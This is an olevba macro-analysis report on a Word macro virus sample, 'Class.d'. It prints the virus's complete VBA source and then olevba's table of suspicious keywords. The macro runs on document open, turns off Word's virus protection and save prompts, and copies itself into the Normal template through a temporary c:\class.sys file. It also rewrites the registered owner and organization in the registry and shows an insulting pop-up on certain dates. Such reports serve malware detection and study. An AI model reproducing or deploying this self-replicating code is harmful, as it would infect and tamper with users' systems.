olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-55f1690cdf1e1dadbbbbf59afb6f93c8fae52fcd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-55f1690cdf1e1dadbbbbf59afb6f93c8fae52fcd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Const REG_SZ As Long = 1
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Sub AutoOpen()
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
On Error GoTo out
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Options.VirusProtection = False
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Options.SaveNormalPrompt = False
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Options.ConfirmConversions = False
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If nt > 70 And ad > 0 Then GoTo out
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If nt < 70 Then
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End If
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
With host.codemodule
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    For x = 1 To 16
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    .deletelines 1
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    Next x
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End With
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If nt < 70 Then
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    With host.codemodule
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    .replaceline 1, "Sub AutoClose()"
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    .replaceline 91, "Sub ToolsMacro()"
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    For x = 70 To 81
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
        .deletelines 62
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    Next x
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    .replaceline 35, "    For x = 1 To 4"
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    End With
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End If
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If nt < 70 Then
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
u = RegCloseKey(k)
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End If
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
With host.codemodule
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    For x = 2 To 104 Step 2
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
    Next x
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End With
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
out:
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End Sub
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
Sub ViewVBCode()
'Jim & Kim5/2/2000 7:56:31 PMCanon  BJC-4400 Series on LPT1:newmalibuproposal.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
